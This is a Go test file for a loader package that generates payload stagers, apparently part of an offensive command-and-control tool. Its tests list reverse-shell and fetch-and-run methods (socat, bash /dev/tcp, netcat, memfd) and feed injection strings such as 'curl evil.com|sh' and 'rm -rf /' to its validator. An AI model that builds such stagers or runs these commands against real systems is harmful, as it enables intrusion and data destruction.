package loader

import (
	"strings"
	"testing"
)

func TestValidateOpts_Safe(t *testing.T) {
	err := ValidateOpts(StagerOpts{
		Host:  "10.0.0.1",
		Port:  "8443",
		Token: "aabbccdd11223344",
	})
	if err != nil {
		t.Errorf("expected safe opts to pass, got: %v", err)
	}
}

func TestValidateOpts_Injection(t *testing.T) {
	cases := []struct {
		name string
		opts StagerOpts
	}{
		{"semicolon in host", StagerOpts{Host: "10.0.0.1;curl evil.com|sh", Port: "443", Token: "abc"}},
		{"backtick in host", StagerOpts{Host: "`whoami`", Port: "443", Token: "abc"}},
		{"pipe in port", StagerOpts{Host: "10.0.0.1", Port: "443|sh", Token: "abc"}},
		{"dollar in token", StagerOpts{Host: "10.0.0.1", Port: "443", Token: "$(evil)"}},
		{"space in host", StagerOpts{Host: "10.0.0.1 evil", Port: "443", Token: "abc"}},
		{"empty host", StagerOpts{Host: "", Port: "443", Token: "abc"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if err := ValidateOpts(tc.opts); err == nil {
				t.Error("expected validation error for unsafe input")
			}
		})
	}
}

func TestValidateOpts_RejectsInLoader(t *testing.T) {
	l, _ := Get("curl")
	_, err := l.Generate(StagerOpts{
		Host:  "10.0.0.1;rm -rf /",
		Port:  "443",
		Token: "aabb",
	})
	if err == nil {
		t.Error("loader should reject unsafe host")
	}
}

func TestAllLoadersRegistered(t *testing.T) {
	all := List()
	if len(all) < 12 {
		t.Errorf("expected at least 12 loaders, got %d", len(all))
	}

	expected := []string{
		"socat-tls", "socat-tcp", "socat-memfd", "socat-pty",
		"curl", "wget", "bash-devtcp", "python",
		"netcat", "perl", "memfd", "devshm",
	}
	for _, name := range expected {
		if _, ok := Get(name); !ok {
			t.Errorf("loader %q not registered", name)
		}
	}
}

func TestLoadersGenerate(t *testing.T) {
	opts := StagerOpts{
		Host:       "10.0.0.1",
		Port:       "8443",
		Token:      "aabbccdd11223344aabbccdd11223344",
		PayloadID:  "p1",
		TargetOS:   "linux",
		TargetArch: "amd64",
		TLS:        true,
	}

	all := List()
	for _, l := range all {
		t.Run(l.Name(), func(t *testing.T) {
			stager, err := l.Generate(opts)
			if err != nil {
				t.Fatal(err)
			}
			if stager == "" {
				t.Error("empty stager output")
			}
			if !strings.Contains(stager, "10.0.0.1") {
				t.Error("stager should contain host")
			}
			if !strings.Contains(stager, "8443") {
				t.Error("stager should contain port")
			}
			// Token should appear in stager (either in URL path or as raw value)
			if !strings.Contains(stager, opts.Token) {
				t.Error("stager should contain token")
			}
		})
	}
}

func TestLoaderSupports(t *testing.T) {
	supported := ListSupported("linux", "amd64")
	if len(supported) < 10 {
		t.Errorf("expected at least 10 linux loaders, got %d", len(supported))
	}

	// Windows targets should get fewer loaders
	winSupported := ListSupported("windows", "amd64")
	if len(winSupported) >= len(supported) {
		t.Error("windows should have fewer supported loaders than linux")
	}
}

func TestLoaderRequiresTool(t *testing.T) {
	l, _ := Get("curl")
	if l.RequiresTool() != "curl" {
		t.Errorf("curl loader should require curl, got %q", l.RequiresTool())
	}

	l2, _ := Get("bash-devtcp")
	if l2.RequiresTool() != "bash" {
		t.Errorf("bash-devtcp should require bash, got %q", l2.RequiresTool())
	}
}
